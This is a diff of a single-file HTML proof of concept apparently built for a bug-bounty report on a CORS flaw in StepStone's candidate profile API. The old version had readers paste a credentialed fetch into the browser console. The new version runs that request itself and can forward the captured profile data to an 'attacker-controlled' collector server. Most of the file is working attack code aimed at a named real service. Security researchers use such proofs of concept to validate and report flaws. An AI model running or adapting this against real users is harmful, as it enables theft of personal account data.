@@ -2,68 +2,126 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>Hello — Paste PoC in Console</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>StepStone CORS PoC</title>
   <style>
-    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding: 28px; color:#0f172a; background:#f8fafc; }
-    h1 { margin:0 0 10px 0; font-size:28px; }
-    p { margin:0 0 18px 0; color:#475569; }
-    textarea { width:100%; height:220px; padding:10px; border-radius:8px; border:1px solid #cbd5e1; font-family: monospace; background:#fff; }
-    button { margin-top:10px; padding:10px 14px; border-radius:8px; border:0; background:#0ea5a4; color:white; cursor:pointer; }
-    .muted { color:#64748b; font-size:0.95rem; margin-top:10px; }
+    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:16px;background:#f7fafc;color:#0f172a}
+    pre{background:#fff;border:1px solid #e2e8f0;padding:12px;border-radius:8px;overflow:auto;max-height:45vh}
+    .card{background:#fff;padding:12px;border-radius:8px;box-shadow:0 4px 10px rgba(2,6,23,0.04);margin-bottom:12px}
+    label{display:block;margin:6px 0;font-weight:600}
+    input[type=text]{width:100%;padding:8px;border-radius:6px;border:1px solid #cbd5e1}
+    button{padding:8px 12px;border-radius:6px;border:none;background:#0ea5a4;color:white;cursor:pointer}
+    button.secondary{background:#334155}
+    .muted{color:#64748b;font-size:0.9rem}
   </style>
 </head>
 <body>
-  <h1>Hello</h1>
-  <p>Open Developer Tools → Console in this browser session (same profile where you're logged into StepStone). Click <strong>Copy PoC</strong>, then paste the copied code into the Console and press Enter.</p>
-
-  <label for="poc">PoC fetch (copy & paste into console):</label>
-  <textarea id="poc" readonly>
-fetch('https://www.stepstone.de/candidate/profile/editor/api/v1/profile', {
-  method: 'GET',
-  credentials: 'include', // Sends authenticated cookies
-  headers: {
-    // replace origin value with your PoC domain if you want a different origin shown
-    'Origin': 'https://www.stepstone.de.i-am-hunter.xyz'
-  }
-})
-.then(response => {
-  console.log("✅ Server reflected origin:", response.headers.get('Access-Control-Allow-Origin'));
-  console.log("✅ Access-Control-Allow-Credentials:", response.headers.get('Access-Control-Allow-Credentials'));
-  return response.text().then(t => {
-    try { return JSON.parse(t); } catch(e){ return t; }
-  });
-})
-.then(data => {
-  console.log("✅ Response body:", data);
-  // optionally display on page
-  const pre = document.createElement('pre');
-  pre.textContent = JSON.stringify(data, null, 2);
-  document.body.appendChild(pre);
-})
-.catch(error => console.error('Error:', error));
-  </textarea>
-
-  <div>
-    <button id="copyBtn">Copy PoC</button>
+  <h1>StepStone CORS PoC (single-file)</h1>
+  <div class="card">
+    <div class="muted">IMPORTANT: Use only with accounts you control. Do not test on other users or accounts without permission. This PoC is for triage and validation of an issue you reported.</div>
   </div>
 
-  <div class="muted">Tip: In Firefox press <kbd>Ctrl+Shift+K</kbd>, in Chrome press <kbd>Ctrl+Shift+J</kbd> (or F12) to open Console. Then paste and run.</div>
+  <div class="card">
+    <label>Target endpoint</label>
+    <input id="target" value="https://www.stepstone.de/candidate/profile/editor/api/v1/profile">
+
+    <label>PoC origin (what to send as Origin header)</label>
+    <input id="pocOrigin" value="https://www.stepstone.de.i-am-hunter.xyz">
+
+    <label>Optional: collector URL (your attacker-controlled logging server). Leave blank to skip forwarding.</label>
+    <input id="collector" placeholder="https://collector.xyz/receive">
+
+    <div style="margin-top:10px">
+      <button id="run">Run PoC (fetch with credentials)</button>
+      <button id="clear" class="secondary">Clear output</button>
+      <button id="save" class="secondary">Save logs</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <label>Result / Console</label>
+    <pre id="out">Ready. Click "Run PoC" to execute the cross-origin fetch from this origin.</pre>
+  </div>
 
   <script>
-    document.getElementById('copyBtn').addEventListener('click', async () => {
-      const txt = document.getElementById('poc').value;
-      try {
-        await navigator.clipboard.writeText(txt);
-        alert('PoC copied to clipboard — now open DevTools Console and paste (Ctrl+V) then Enter.');
-        console.log('PoC copied to clipboard. Paste into console to run.');
-      } catch (e) {
-        // fallback
-        document.getElementById('poc').select();
-        document.execCommand('copy');
-        alert('Copied (fallback). Paste into Console (Ctrl+V) and press Enter.');
+    // Configuration and helpers
+    const out = document.getElementById('out');
+    const targetEl = document.getElementById('target');
+    const originEl = document.getElementById('pocOrigin');
+    const collectorEl = document.getElementById('collector');
+
+    function log(...args){
+      const t = new Date().toISOString();
+      const line = `[${t}] ` + args.map(a => (typeof a === 'string'? a : JSON.stringify(a, null, 2))).join(' ');
+      out.textContent = line + "\n" + out.textContent;
+      return line;
+    }
+
+    async function runPoC(){
+      const target = targetEl.value.trim();
+      const fakeOrigin = originEl.value.trim();
+      if(!target){ alert('Specify target endpoint'); return; }
+
+      log('Starting PoC — target=' + target + ' origin=' + fakeOrigin);
+
+      try{
+        const resp = await fetch(target, {
+          method: 'GET',
+          credentials: 'include',
+          headers: {
+            // NOTE: browsers will block programmatic setting of some forbidden headers in many contexts.
+            // This header value is helpful for testing when replaying requests via Burp or custom clients,
+            // but a real browser may ignore a programmatic Origin override. Keep the field so reviewers
+            // understand intent; for reliable results use a controlled page hosted at the PoC origin or
+            // test with a manual proxy that rewrites headers.
+            'Origin': fakeOrigin
+          }
+        });
+
+        log('HTTP status: ' + resp.status + ' ' + resp.statusText);
+        const aca = resp.headers.get('Access-Control-Allow-Origin');
+        const acc = resp.headers.get('Access-Control-Allow-Credentials');
+        log('Access-Control-Allow-Origin: ' + aca);
+        log('Access-Control-Allow-Credentials: ' + acc);
+
+        const text = await resp.text();
+        let body;
+        try{ body = JSON.parse(text); }
+        catch(e){ body = text; }
+
+        log('Response body (trimmed to 10k chars):');
+        const display = (typeof body === 'string') ? body.slice(0,10000) : JSON.stringify(body, null, 2).slice(0,10000);
+        log(display);
+
+        // Optional: forward to your collector server if you provided one. This is commented out by default
+        // to avoid accidental exfiltration. Uncomment and set collector URL only when using a test account.
+        const collector = collectorEl.value.trim();
+        if(collector){
+          try{
+            // WARNING: only use with your own test account and your own collector domain.
+            await fetch(collector, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ts:new Date().toISOString(), origin: fakeOrigin, target, status: resp.status, headers: {aca, acc}, body})});
+            log('Forwarded captured data to collector: ' + collector);
+          }catch(e){ log('Failed to forward to collector: ' + e); }
+        }
+
+      }catch(err){
+        log('Fetch error: ' + err);
       }
+    }
+
+    document.getElementById('run').addEventListener('click', runPoC);
+    document.getElementById('clear').addEventListener('click', ()=> out.textContent='');
+    document.getElementById('save').addEventListener('click', ()=>{
+      const blob = new Blob([out.textContent], {type:'text/plain'});
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = 'poc_logs_' + (new Date().toISOString().replace(/[:.]/g,'-')) + '.txt';
+      a.click();
+      URL.revokeObjectURL(a.href);
     });
+
+    // Auto-run is intentionally disabled. Uncomment to auto-run on page load (only for testing).
+    // window.addEventListener('load', runPoC);
   </script>
 </body>
 </html>
